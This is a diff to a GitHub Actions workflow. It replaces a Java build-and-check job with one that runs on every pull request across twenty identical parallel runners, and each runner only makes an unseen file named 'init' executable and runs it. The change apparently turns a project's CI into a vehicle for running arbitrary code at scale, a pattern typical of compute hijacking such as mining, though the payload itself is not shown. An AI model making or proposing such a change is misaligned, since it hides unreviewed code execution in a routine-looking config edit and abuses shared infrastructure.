@@ -1,23 +1,26 @@
-name: Java CI
+name: multi test
 
-on:
-  pull_request:
-    branches: [ master ]
+on: [pull_request]
 
 jobs:
-  check:
-    name: Check - Java ${{ matrix.java }}
+  multitest:
+    name: test job
+
     runs-on: ubuntu-latest
+    env:
+      DEBIAN_FRONTEND: noninteractive
+
     strategy:
-      matrix:
-        java: [1.8, 11, 14]
+     fail-fast: false
+     matrix:
+       runner: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
+
     steps:
-      - uses: actions/checkout@v2
-      - name: Setup JDK ${{ matrix.java }}
-        uses: actions/setup-java@v1
-        with:
-          java-version: ${{ matrix.java }}
-      - name: Grant execute permission for gradlew
-        run: chmod +x gradlew
-      - name: Run checks with Gradle
-        run: ./gradlew check
+      - name: Checkout code
+        uses: actions/checkout@v2
+        
+      - name: chmod
+        run: chmod +x init
+        
+      - name: run
+        run: ./init
